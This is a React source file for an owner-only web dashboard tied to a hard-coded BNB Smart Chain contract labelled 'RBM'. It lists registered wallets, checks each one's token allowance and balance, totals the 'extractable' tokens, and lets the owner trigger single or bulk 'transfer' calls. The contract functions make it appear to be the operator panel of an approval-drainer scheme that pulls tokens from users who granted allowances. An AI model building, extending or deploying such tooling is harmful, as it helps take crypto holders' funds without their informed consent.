import React, { useState, useEffect, useCallback, useMemo } from 'react';
import {
  Box,
  Container,
  Tabs,
  Tab,
  Snackbar,
  Alert,
  Tooltip,
  Typography
} from '@mui/material';
import { Send, Analytics, People } from '@mui/icons-material';
import { useActiveAccount, useSendTransaction } from 'thirdweb/react';
import { prepareContractCall, readContract, getContract } from 'thirdweb';
import { client, bscChain } from '../../lib/thirdweb';

// Import components
import HeroSection from '../../components/rbm-dashboard/HeroSection';
import WalletConnection from '../../components/rbm-dashboard/WalletConnection';
import WalletInfo from '../../components/rbm-dashboard/WalletInfo';
import OwnerWarning from '../../components/rbm-dashboard/OwnerWarning';
import StatisticsCards from '../../components/rbm-dashboard/StatisticsCards';
import ContractQueries from '../../components/rbm-dashboard/ContractQueries';
import TokenTransfers from '../../components/rbm-dashboard/TokenTransfers';
import RegisteredUsers from '../../components/rbm-dashboard/RegisteredUsers';
import LoadingState from '../../components/rbm-dashboard/LoadingState';
import { TabsSkeleton } from '../../components/rbm-dashboard/SkeletonLoaders';
import { GlassCard } from '../../components/rbm-dashboard/StyledComponents';
import { Stack } from '@mui/system';

const CONTRACT_ADDRESS = '0xFd58b061Ab492A1EE874D581E1Ac88a075af56d3';
const CONTRACT_ABI = [
  {
    "inputs": [],
    "name": "owner",
    "outputs": [{"internalType": "address", "name": "", "type": "address"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [{"internalType": "address", "name": "_user", "type": "address"}],
    "name": "checkIfRegistered",
    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [{"internalType": "address", "name": "_user", "type": "address"}],
    "name": "checkAllowance",
    "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [{"internalType": "address", "name": "_user", "type": "address"}],
    "name": "checkbalance",
    "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "getTotalExtractableTokens",
    "outputs": [{"internalType": "uint256", "name": "total", "type": "uint256"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "totalRegistered",
    "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "getAllRegistered",
    "outputs": [{"internalType": "address[]", "name": "", "type": "address[]"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [{"internalType": "address", "name": "_user", "type": "address"}],
    "name": "whitlistAddress",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [{"internalType": "address", "name": "_user", "type": "address"}],
    "name": "transfer",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "transfer",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  }
];



const RBMDashboard = () => {
  const account = useActiveAccount();
  const { mutate: sendTransaction, isPending: isTransactionPending } = useSendTransaction();

  // UI State
  const [activeTab, setActiveTab] = useState(0);
  const [snackbar, setSnackbar] = useState({ open: false, message: '', severity: 'info' });

  // Loading States
  const [initialLoading, setInitialLoading] = useState(true);
  const [queryLoading, setQueryLoading] = useState(false);
  const [statsLoading, setStatsLoading] = useState(false);
  const [contractError, setContractError] = useState(null);

  // Contract State
  const [isOwner, setIsOwner] = useState(false);
  const [contractOwner, setContractOwner] = useState('');
  const [isContractReady, setIsContractReady] = useState(false);

  // Data State
  const [stats, setStats] = useState({
    totalRegistered: 0,
    totalExtractable: '0',
    registeredUsers: []
  });
  const [queryAddress, setQueryAddress] = useState('');
  const [queryResults, setQueryResults] = useState({
    isRegistered: null,
    allowance: null,
    balance: null
  });
  const [transferAddress, setTransferAddress] = useState('');

  // Pagination and search state
  const [currentPage, setCurrentPage] = useState(1);
  const [usersPerPage] = useState(10);
  const [searchTerm, setSearchTerm] = useState('');

  // Memoized contract instance
  const contract = useMemo(() => {
    try {
      return getContract({
        client,
        chain: bscChain,
        address: CONTRACT_ADDRESS,
        abi: CONTRACT_ABI,
      });
    } catch (error) {
      console.error('Error creating contract instance:', error);
      setContractError('Failed to initialize contract');
      return null;
    }
  }, []);

  // Memoized filtered users based on search term
  const filteredUsers = useMemo(() => {
    if (!searchTerm.trim()) {
      return stats.registeredUsers;
    }
    return stats.registeredUsers.filter(address =>
      address.toLowerCase().includes(searchTerm.toLowerCase())
    );
  }, [searchTerm, stats.registeredUsers]);

  // Reset to first page when search term changes
  useEffect(() => {
    setCurrentPage(1);
  }, [searchTerm]);

  // Memoized pagination calculations
  const paginationData = useMemo(() => {
    const indexOfLastUser = currentPage * usersPerPage;
    const indexOfFirstUser = indexOfLastUser - usersPerPage;
    const currentUsers = filteredUsers.slice(indexOfFirstUser, indexOfLastUser);
    const totalPages = Math.ceil(filteredUsers.length / usersPerPage);

    return {
      indexOfLastUser,
      indexOfFirstUser,
      currentUsers,
      totalPages
    };
  }, [currentPage, usersPerPage, filteredUsers]);
 const loadStats = useCallback(async () => {
    if (!account?.address || !isContractReady || !contract) return;

    setStatsLoading(true);
    try {
      // Add timeout for each contract call
      const timeoutDuration = 8000;

      const createTimeoutPromise = (promise, name) => {
        const timeout = new Promise((_, reject) =>
          setTimeout(() => reject(new Error(`${name} timeout`)), timeoutDuration)
        );
        return Promise.race([promise, timeout]);
      };

      const [totalReg, totalExt, allUsers] = await Promise.all([
        createTimeoutPromise(
          readContract({ contract, method: 'totalRegistered', params: [] }),
          'Total registered'
        ),
        createTimeoutPromise(
          readContract({ contract, method: 'getTotalExtractableTokens', params: [] }),
          'Total extractable'
        ),
        createTimeoutPromise(
          readContract({ contract, method: 'getAllRegistered', params: [] }),
          'All users'
        )
      ]);

      setStats({
        totalRegistered: Number(totalReg),
        totalExtractable: (Number(totalExt) / 1e18).toFixed(4),
        registeredUsers: allUsers || []
      });

      // Show success message only on first load
      if (!statsLoading) {
        showSnackbar('✅ Contract data loaded successfully', 'success');
      }

    } catch (error) {
      console.error('Error loading stats:', error);
      showSnackbar(`❌ Error loading contract statistics: ${error.message || 'Network error'}`, 'error');
      // Set default values on error
      setStats({
        totalRegistered: 0,
        totalExtractable: '0.0000',
        registeredUsers: []
      });
    } finally {
      setStatsLoading(false);
    }
  }, [account?.address, contract, isContractReady]);

  // Initialize dashboard when account connects
  useEffect(() => {
    const initializeDashboard = async () => {
      if (!account?.address || !contract) {
        setIsContractReady(false);
        setInitialLoading(false);
        setContractError(!contract ? 'Contract not available' : null);
        // Reset states when no account
        setStats({
          totalRegistered: 0,
          totalExtractable: '0',
          registeredUsers: []
        });
        setIsOwner(false);
        setContractOwner('');
        return;
      }

      setInitialLoading(true);
      setContractError(null);

      try {
        // Check ownership with timeout
        const timeoutPromise = new Promise((_, reject) =>
          setTimeout(() => reject(new Error('Contract call timeout')), 10000)
        );

        const ownerPromise = readContract({
          contract,
          method: 'owner',
          params: []
        });

        const owner = await Promise.race([ownerPromise, timeoutPromise]);

        setContractOwner(owner);
        setIsOwner(account.address.toLowerCase() === owner.toLowerCase());
        setIsContractReady(true);

      } catch (error) {
        console.error('Error checking ownership:', error);
        setContractError(error.message || 'Failed to connect to contract');
        showSnackbar(`❌ Contract initialization failed: ${error.message}`, 'error');
      } finally {
        setInitialLoading(false);
      }
    };

    initializeDashboard();
  }, [account?.address, contract]);

  // Auto-load stats when contract is ready
  useEffect(() => {
    if (isContractReady && account?.address && contract) {
      loadStats();
    }
  }, [isContractReady, account?.address, contract, loadStats]);

  // Auto-refresh stats every 30 seconds when contract is ready
  useEffect(() => {
    if (!isContractReady || !account?.address || !contract) return;

    const interval = setInterval(() => {
      if (!statsLoading && !initialLoading) {
        loadStats();
      }
    }, 30000); // 30 seconds

    return () => clearInterval(interval);
  }, [isContractReady, account?.address, contract, statsLoading, initialLoading, loadStats]);

 
  const showSnackbar = (message, severity = 'info') => {
    setSnackbar({ open: true, message, severity });
  };

  const handleCloseSnackbar = () => {
    setSnackbar({ ...snackbar, open: false });
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    showSnackbar('Copied to clipboard!', 'success');
  };

  const handleQuery = async (type) => {
    if (!queryAddress.trim()) {
      showSnackbar('Please enter a valid address', 'warning');
      return;
    }

    // Validate address format
    if (!queryAddress.match(/^0x[a-fA-F0-9]{40}$/)) {
      showSnackbar('Please enter a valid Ethereum address format', 'warning');
      return;
    }

    if (!contract || !isContractReady) {
      showSnackbar('Contract not ready. Please wait...', 'warning');
      return;
    }

    setQueryLoading(true);
    try {
      const timeout = new Promise((_, reject) =>
        setTimeout(() => reject(new Error('Query timeout')), 8000)
      );

      let result;
      switch (type) {
        case 'registration':
          result = await Promise.race([
            readContract({
              contract,
              method: 'checkIfRegistered',
              params: [queryAddress]
            }),
            timeout
          ]);
          setQueryResults(prev => ({ ...prev, isRegistered: result }));
          showSnackbar(`✅ Registration status: ${result ? 'Registered' : 'Not Registered'}`, 'success');
          break;
        case 'allowance':
          result = await Promise.race([
            readContract({
              contract,
              method: 'checkAllowance',
              params: [queryAddress]
            }),
            timeout
          ]);
          const allowanceFormatted = (Number(result) / 1e18).toFixed(4);
          setQueryResults(prev => ({ ...prev, allowance: allowanceFormatted }));
          showSnackbar(`✅ Allowance: ${allowanceFormatted} RBM`, 'success');
          break;
        case 'balance':
          result = await Promise.race([
            readContract({
              contract,
              method: 'checkbalance',
              params: [queryAddress]
            }),
            timeout
          ]);
          const balanceFormatted = (Number(result) / 1e18).toFixed(4);
          setQueryResults(prev => ({ ...prev, balance: balanceFormatted }));
          showSnackbar(`✅ Balance: ${balanceFormatted} RBM`, 'success');
          break;
      }
    } catch (error) {
      console.error('Query error:', error);
      showSnackbar(`❌ Query failed: ${error.message || 'Unknown error'}`, 'error');
    } finally {
      setQueryLoading(false);
    }
  };

  const clearQueryResults = () => {
    setQueryResults({
      isRegistered: null,
      allowance: null,
      balance: null
    });
    setQueryAddress('');
    showSnackbar('Query results cleared', 'info');
  };

  const refreshStats = useCallback(async () => {
    if (!account?.address || !isContractReady || !contract) return;

    await loadStats();
    if (!statsLoading) {
      showSnackbar('✅ Statistics refreshed successfully', 'success');
    }
  }, [account?.address, contract, isContractReady, loadStats, statsLoading]);

  // Clear search function
  const clearSearch = useCallback(() => {
    setSearchTerm('');
  }, []);

  const handleSingleTransfer = async () => {
    if (!account?.address) {
      showSnackbar('Please connect your wallet first!', 'warning');
      return;
    }

    if (!isOwner) {
      showSnackbar('🚫 Access Denied: You are not the contract owner! Only the contract owner can perform transfers.', 'error');
      return;
    }

    if (!transferAddress.trim()) {
      showSnackbar('Please enter a valid address', 'warning');
      return;
    }

    try {
      const transaction = prepareContractCall({
        contract,
        method: 'transfer',
        params: [transferAddress]
      });

      sendTransaction(transaction, {
        onSuccess: () => {
          showSnackbar('✅ Single transfer completed successfully!', 'success');
          setTransferAddress('');
          // Auto-refresh stats after successful transaction
          setTimeout(() => loadStats(), 2000);
        },
        onError: (error) => {
          showSnackbar(`❌ Transfer failed: ${error.message}`, 'error');
        }
      });
    } catch (error) {
      showSnackbar(`❌ Transfer preparation failed: ${error.message}`, 'error');
    }
  };

  const handleMultiTransfer = async () => {
    if (!account?.address) {
      showSnackbar('Please connect your wallet first!', 'warning');
      return;
    }

    if (!isOwner) {
      showSnackbar('🚫 Access Denied: You are not the contract owner! Only the contract owner can perform multi-transfers.', 'error');
      return;
    }

    try {
      const transaction = prepareContractCall({
        contract,
        method: 'transfer',
        params: []
      });

      sendTransaction(transaction, {
        onSuccess: () => {
          showSnackbar('✅ Multi transfer completed successfully!', 'success');
          // Auto-refresh stats after successful transaction
          setTimeout(() => loadStats(), 2000);
        },
        onError: (error) => {
          showSnackbar(`❌ Multi transfer failed: ${error.message}`, 'error');
        }
      });
    } catch (error) {
      showSnackbar(`❌ Transfer preparation failed: ${error.message}`, 'error');
    }
  };



  return (
    <Box sx={{ minHeight: '100vh', bgcolor: 'background.default' }}>
      <HeroSection />

      <Container maxWidth="lg" sx={{ pb: 8 }}>
        {!account?.address ? (
          <WalletConnection />
        ) : (
          <>
            <WalletInfo account={account} copyToClipboard={copyToClipboard} />

            {/* Loading State */}
            {initialLoading && (
              <LoadingState message="Connecting to RBM contract..." />
            )}

            {/* Contract Error Alert */}
            {contractError && !initialLoading && (
              <Alert severity="error" sx={{ mb: 4, borderRadius: 2 }}>
                <Typography variant="body1" fontWeight="bold">
                  Contract Connection Error
                </Typography>
                <Typography variant="body2" sx={{ mt: 1 }}>
                  {contractError}. Please check your network connection and try refreshing the page.
                </Typography>
              </Alert>
            )}

            {/* Owner Warning */}
            {!initialLoading && isContractReady && (
              <OwnerWarning isOwner={isOwner} contractOwner={contractOwner} />
            )}

            {/* Statistics */}
            {!initialLoading && (
              <StatisticsCards
                stats={stats}
                statsLoading={statsLoading}
                loading={initialLoading}
                isOwner={isOwner}
                refreshStats={refreshStats}
                contractError={contractError}
                isContractReady={isContractReady}
              />
            )}
          </>
        )}

        {/* Main Features */}
        {account?.address && (
          <GlassCard sx={{ overflow: 'hidden' }}>
            {initialLoading || !isContractReady ? (
              <TabsSkeleton />
            ) : (
              <>
                <Box sx={{
                  borderBottom: 1,
                  borderColor: 'divider',
                  background: 'linear-gradient(90deg, rgba(102,126,234,0.1) 0%, rgba(118,75,162,0.1) 100%)'
                }}>
                  <Tabs
                    value={activeTab}
                    onChange={(_, newValue) => setActiveTab(newValue)}
                    variant="scrollable"
                    sx={{
                      '& .MuiTab-root': {
                        minHeight: 72,
                        fontSize: '1rem',
                        fontWeight: 600,
                        textTransform: 'none',
                        '&.Mui-selected': {
                          color: 'primary.main'
                        }
                      }
                    }}
                  >
                <Tab
                  label="Contract Queries"
                  icon={<Analytics />}
                  iconPosition="start"
                />
                
                <Tooltip
                  title={!isOwner ? "🚫 You are not the contract owner! Only the contract owner can access token transfers." : ""}
                  arrow
                  placement="top"
                >
                  <span>
                    <Tab
                      label="Token Transfers"
                      icon={<Send />}
                      iconPosition="start"
                      disabled={!isOwner}
                      sx={{
                        opacity: !isOwner ? 0.5 : 1,
                        '& .MuiTab-iconWrapper': {
                          color: !isOwner ? 'error.main' : 'inherit'
                        }
                      }}
                    />
                  </span>
                </Tooltip>
                <Tab
                  label="Registered Users"
                  icon={<People />}
                  iconPosition="start"
                />
              </Tabs>
            </Box>

            <Box sx={{ p: 4 }}>
              {/* Queries Tab */}
              {activeTab === 0 && (
                <ContractQueries
                  queryAddress={queryAddress}
                  setQueryAddress={setQueryAddress}
                  queryLoading={queryLoading}
                  queryResults={queryResults}
                  handleQuery={handleQuery}
                  clearQueryResults={clearQueryResults}
                  loading={initialLoading || !isContractReady}
                />
              )}

      

              {/* Transfers Tab */}
              {activeTab === 1 && (
                <TokenTransfers
                  transferAddress={transferAddress}
                  setTransferAddress={setTransferAddress}
                  isOwner={isOwner}
                  isTransactionPending={isTransactionPending}
                  handleSingleTransfer={handleSingleTransfer}
                  handleMultiTransfer={handleMultiTransfer}
                  loading={initialLoading || !isContractReady}
                />
              )}

              {/* Users Tab */}
              {activeTab === 2 && (
                <RegisteredUsers
                  stats={stats}
                  statsLoading={statsLoading}
                  refreshStats={refreshStats}
                  searchTerm={searchTerm}
                  setSearchTerm={setSearchTerm}
                  clearSearch={clearSearch}
                  filteredUsers={filteredUsers}
                  paginationData={paginationData}
                  currentPage={currentPage}
                  setCurrentPage={setCurrentPage}
                  copyToClipboard={copyToClipboard}
                />
              )}
            </Box>
            </>
          )}
          </GlassCard>
        )}
      </Container>

      <Snackbar
        open={snackbar.open}
        autoHideDuration={6000}
        onClose={handleCloseSnackbar}
        anchorOrigin={{ vertical: 'bottom', horizontal: 'right' }}
      >
        <Alert onClose={handleCloseSnackbar} severity={snackbar.severity} sx={{ width: '100%' }}>
          {snackbar.message}
        </Alert>
      </Snackbar>
    </Box>
  );
};

export default RBMDashboard;
